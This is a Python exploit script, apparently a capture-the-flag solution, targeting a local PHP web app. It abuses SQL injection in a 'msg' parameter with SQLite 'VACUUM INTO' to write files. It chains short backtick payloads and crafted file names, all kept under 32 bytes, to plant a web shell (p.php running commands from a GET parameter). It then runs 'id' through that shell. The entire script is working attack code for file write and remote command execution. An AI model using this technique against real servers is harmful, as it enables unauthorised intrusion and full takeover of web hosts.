import requests
from time import sleep
from urllib.parse import quote



URL = 'http://127.0.0.1:8080/'

sandbox = 'sandbox/2c99af72512d73e6df356853ae5e9255/'

def create(filename):
    payload = b"');VACUUM INTO('%s" % (filename)

    assert len(payload) < 32, print(len(payload))

    url = URL + '?msg=' + quote(payload)
    r = requests.get(url) 
    print('%-42s %02d %4d' % (repr(payload), len(payload), r.status_code) )

def execphp(data, filename):
    payload = b"<?=`%s`;');VACUUM INTO('%s" % (data, filename)
    
    assert len(payload) < 32, print(len(payload))

    url = URL + '?msg=' + quote(payload)
    r = requests.get(url) 
    print('%-42s %02d %4d' % (repr(payload), len(payload), r.status_code) )

    sleep(0.1)
    r = requests.get(URL + sandbox + quote(filename))



# reset
r = requests.get(URL + '?reset=1')

payload = [
    b'm|echo "<?=\\`\\', 
    b'n;\\$_GET[\\', 
    b'o]\\`;?>" >\\', 
    b'p.php;'
]

count = 0
for i in payload:
    create(i)

execphp(b'>ls', b'x.php')
execphp(b'*>g', b'y.php')
create(b'bash')
execphp(b'*', b'z.php')
r = requests.get(URL + sandbox + 'p.php?o=id')
print(r.content)